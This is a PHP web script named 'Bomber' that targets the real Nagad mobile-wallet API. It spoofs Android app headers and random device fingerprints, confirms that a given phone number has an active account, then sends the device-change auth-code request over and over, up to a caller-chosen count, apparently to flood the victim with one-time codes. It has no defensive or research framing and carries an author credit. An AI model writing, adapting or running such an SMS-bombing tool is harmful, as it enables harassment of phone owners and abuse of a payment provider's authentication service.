<?php

class Bomber {
    private $num;
    private $amt;
    private $uid = null;
    private $successCount = 0;
    private $failedCount = 0;

    public function __construct($num, $amt) {
        $this->num = $num;
        $this->amt = intval($amt);
        $this->start();
    }

    private function start() {
        if ($this->check()) {
            $this->bomb();
            $this->respo();
        }
    }

    private function sexy($url, $method = 'GET', $headers = [], $payload = null) {
        $ch = curl_init();

        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        }

        $formattedHeaders = [];
        foreach ($headers as $header) {
            $formattedHeaders[] = $header;
        }

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $formattedHeaders);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

        $response = curl_exec($ch);

        if ($response === false) {
            $error = curl_error($ch);
            curl_close($ch);
            return json_decode(json_encode(["error" => $error]), true);
        }

        curl_close($ch);
        return json_decode($response, true);
    }

    private function check() {
        $url = "https://app.mynagad.com:20002/api/user/check-user-status-for-log-in";
        $params = ['msisdn' => $this->num];
        $headers = $this->contHeda();

        $response = $this->sexy($url . '?' . http_build_query($params), 'GET', $headers);
        if (isset($response['status']) && $response['status'] === "ACTIVE") {
            $this->uid = $response['userId'];
            return true;
        } else {
            $this->outputError("NaGad account is not active.");
            return false;
        }
    }

    private function contHeda() {
        return [
            'User-Agent: okhttp/3.14.9',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip',
            'X-KM-UserId: None',
            'X-KM-User-AspId: 100012345612345',
            'X-KM-User-Agent: ANDROID/1152',
            'X-KM-DEVICE-FGP: ' . $this->generateRandomHex(32),
            'X-KM-Accept-language: bn',
            'X-KM-AppCode: 01',
            'Content-Type: application/json; charset=UTF-8'
        ];
    }

    private function bomb() {
        $url = "https://app.mynagad.com:20002/api/wallet/generateAuthCode/deviceChange";
        $payload = ['userId' => $this->uid];

        for ($i = 0; $i < $this->amt; $i++) {
            $response = $this->sexy($url, 'POST', $this->contHeda(), $payload);
            $this->counter($response);
        }
    }

    private function counter($response) {
        if (isset($response['executionStatus']) && $response['executionStatus']['statusType'] === "EXECUTED_SUCCESS") {
            $this->successCount++;
        } else {
            $this->failedCount++;
        }
    }

    private function respo() {
        $result = [
            "Status" => "success - {$this->successCount} & fail - {$this->failedCount}",
            "num" => $this->num,
            "amt" => $this->amt,
            "Credit" => "@THE_ANON_69"
        ];
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }

    private function outputError($message) {
        $error = ["error" => $message];
        echo json_encode($error, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    private function generateRandomHex($length) {
        return strtoupper(bin2hex(random_bytes($length / 2)));
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_GET['numb']) && isset($_GET['limit'])) {
        $num = $_GET['numb'];
        $amt = $_GET['limit'];

        if (filter_var($amt, FILTER_VALIDATE_INT)) {
            new Bomber($num, $amt);
        } else {
            echo json_encode(["error" => "Invalid 'limit' parameter."], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        }
    } else {
        echo json_encode(["error" => "Missing parameters 'numb' or 'limit'."], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
} else {
    echo json_encode(["error" => "This script only accepts GET requests."], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}

?>
